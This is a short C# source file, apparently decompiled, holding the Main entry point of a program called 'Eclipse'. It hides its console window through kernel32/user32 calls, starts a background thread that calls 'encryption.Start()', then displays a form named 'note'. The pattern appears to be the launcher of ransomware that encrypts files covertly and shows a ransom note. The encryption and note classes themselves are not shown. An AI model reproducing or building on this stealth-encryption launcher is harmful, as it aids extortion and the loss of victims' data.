using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Eclipse;

internal class Program
{
	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		Thread thread = new Thread((ThreadStart)delegate
		{
			Console.WriteLine("Starting...");
			encryption.Start();
			Application.Run((Form)(object)new note());
		});
		thread.Start();
		while (true)
		{
			Console.ReadKey();
		}
	}
}
